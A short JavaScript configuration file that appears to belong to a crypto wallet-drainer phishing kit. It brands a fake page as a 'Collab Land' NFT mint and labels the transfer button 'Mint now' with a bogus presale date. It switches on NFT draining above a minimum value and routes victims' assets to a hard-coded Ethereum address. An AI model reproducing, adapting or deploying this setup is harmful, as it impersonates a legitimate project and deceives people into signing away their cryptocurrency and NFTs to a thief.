const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
  collectionInfo = {
    name: 'Collab Land',
  },

  drainNftsInfo = {
    active: true,
    minValue: 0.1,
    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
  },

  customStrings = {
    title: 'MINT {name}',
    connectButton: 'Connect wallet',
    transferButton: 'Mint now',
    dateString: 'Pre sale available {date}',
  }
  
if (
  !receiveAddress.startsWith('0x') ||
  receiveAddress.length >= 64 || receiveAddress.length <= 40
) {
  console.error(
    'Error: ' + receiveAddress + ' is not a valid Ethereum address.'
  )
}
